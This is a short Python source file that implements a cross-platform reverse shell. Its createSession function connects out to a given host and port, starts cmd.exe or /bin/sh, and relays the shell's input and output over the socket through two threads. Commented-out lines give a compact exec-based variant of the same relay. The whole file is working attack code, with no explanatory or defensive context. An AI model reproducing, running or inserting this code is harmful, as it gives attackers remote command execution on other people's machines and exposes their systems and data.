import os
import platform
import socket
import subprocess
import threading

def __s(p, s):
    while(True):
        o = os.read(p.stdout.fileno(),1024)
        s.send(o)

def __r(p, s):
    while(True):
        i = s.recv(1024)
        os.write(p.stdin.fileno(), i)

def createSession(host, port):
    if platform.system() == "Windows":
        bin = "cmd.exe"
    else:
        bin = "/bin/sh"

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host, port))
    p = subprocess.Popen([bin],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    threading.Thread(target=__s, args=[p, s]).start();
    threading.Thread(target=__r, daemon=True, args=[p, s]).start();
    #threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
    #threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()